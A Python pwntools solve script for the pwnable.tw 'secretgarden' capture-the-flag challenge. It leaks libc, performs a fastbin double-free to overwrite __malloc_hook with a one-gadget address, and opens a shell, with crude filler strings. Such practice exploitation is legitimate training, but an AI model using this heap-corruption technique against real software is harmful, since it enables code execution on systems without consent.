#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

ready = True
if ready:
    conn = remote('chall.pwnable.tw', 10203)
else:
    conn = process(argv = ['/home/doublesine/Desktop/secretgarden'], 
                   env = { 'LD_LIBRARY_PATH' : '/home/doublesine/Desktop/'})

def Sendraw(s):
    conn.send_raw(s)
    print(s)

def Sendline(s):
    conn.sendline(s)
    print(s)

def RaiseFlower(name_size, name, color):
    Sendline('1')
    print conn.read(),
    Sendline(str(name_size))
    print conn.read(),
    Sendraw(name)
    print conn.read(),
    Sendline(color)
    print conn.readline(),

def VisitFlower():
    Sendline('2')
    lines = []
    while True:
        line = conn.readline()
        if line.find('of the flower') != -1:
            line = line.rstrip('\n')
            lines.append(line)
            print(line)
        else:
            print line,
            break
    return lines

def RemoveFlower(i):
    Sendline('3')
    print conn.read(),
    Sendline(str(i))
    print conn.readline(),

def ClearGarden():
    Sendline('4')
    print conn.readline(),

def ExitGarden():
    Sendline('5')
    print conn.readline(),

sleep(0.5)

# leak libc addr
print conn.read(),
RaiseFlower(1024, 'fuck', 'fuck')
print conn.read(),
RaiseFlower(1024, 'fuck', 'fuck')
print conn.read(),
RemoveFlower(0)
print conn.read(),
RaiseFlower(512, 'fuckfuck', 'fuck')
print conn.read(),
recv = VisitFlower()[2]
libc_base_addr = unpack(recv[recv.find('fuckfuck') + 8:].ljust(8, '\x00'), 64) - 0x3C3B78
libc_malloc_hook_addr = libc_base_addr + 0x3C3B10
log.info('libc_base_addr = 0x%016x' % libc_base_addr)
log.info('libc_malloc_hook_addr = 0x%016x' % libc_malloc_hook_addr)

# clear
print conn.read(),
RemoveFlower(1)
print conn.read(),
RemoveFlower(2)
print conn.read(),
ClearGarden()

# Fast-bin attack
# 0x68 = 0x78 - 0x10
print conn.read(),
RaiseFlower(0x68, 'fuck', 'fuck')   # 0
print conn.read(),
RaiseFlower(0x68, 'fuck', 'fuck')   # 1
print conn.read(),
RemoveFlower(1)
print conn.read(),
RemoveFlower(0)
print conn.read(),
RemoveFlower(1)
print conn.read(),
RaiseFlower(0x68, pack(libc_malloc_hook_addr - 0x23, 64), 'fuck')   # 2
print conn.read(),
RaiseFlower(0x68, 'fuck', 'fuck')   # 3
print conn.read(),
RaiseFlower(0x68, 'fuck', 'fuck')   # 4
print conn.read(),
RaiseFlower(0x68, 'A' * (0x23 - 0x10) + pack(libc_base_addr + 0xEF6C4, 64), 'fuck')  # 5

# trigger malloc_hook
print conn.read(),
RemoveFlower(0)
print conn.read(),
Sendline('3')
print conn.read(),
Sendline('0')
conn.interactive()
